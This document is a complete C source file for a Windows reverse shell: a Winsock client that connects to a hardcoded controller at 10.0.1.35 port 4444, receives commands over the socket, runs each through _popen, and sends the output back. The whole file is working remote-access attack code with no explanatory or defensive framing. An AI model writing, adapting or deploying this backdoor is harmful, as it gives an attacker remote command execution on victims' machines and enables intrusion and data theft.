#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define MAX_COMMAND_LENGTH 1024

// Function to initialize Winsock
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        exit(1);
    }
}

// Clean up Winsock
void cleanup_winsock() {
    WSACleanup();
}

// Function to execute a command and send the output back to the server
void execute_command(SOCKET server_socket, char *command) {
    char buffer[MAX_COMMAND_LENGTH];
    FILE *fp;

    // Open a pipe to execute the command
    fp = _popen(command, "r");
    if (fp == NULL) {
        strcpy(buffer, "Failed to execute command\n");
        send(server_socket, buffer, strlen(buffer), 0);
        return;
    }

    // Read the command's output and send it to the server
    while (fgets(buffer, MAX_COMMAND_LENGTH, fp) != NULL) {
        send(server_socket, buffer, strlen(buffer), 0);
    }

    _pclose(fp);
}

int main() {
    SOCKET client_socket;
    struct sockaddr_in server_addr;
    char buffer[MAX_COMMAND_LENGTH];
    int bytes_received;

    // Hardcoded server IP and port
    const char *server_ip = "10.0.1.35";
    const int server_port = 4444;

    // Initialize Winsock
    init_winsock();

    // Create a socket
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    // Connect to the server
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection to server failed with error: %d\n", WSAGetLastError());
        closesocket(client_socket);
        cleanup_winsock();
        exit(1);
    }

    printf("Connected to server %s:%d\n", server_ip, server_port);

    // Main loop to receive and execute commands from the server
    while (1) {
        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH - 1, 0);
        if (bytes_received <= 0) {
            printf("Connection closed or error occurred\n");
            break;
        }

        buffer[bytes_received] = '\0'; // Null-terminate the received data
        printf("Received command: %s", buffer);

        // Execute the command and send the output back to the server
        execute_command(client_socket, buffer);
    }

    // Clean up
    closesocket(client_socket);
    cleanup_winsock();

    return 0;
}
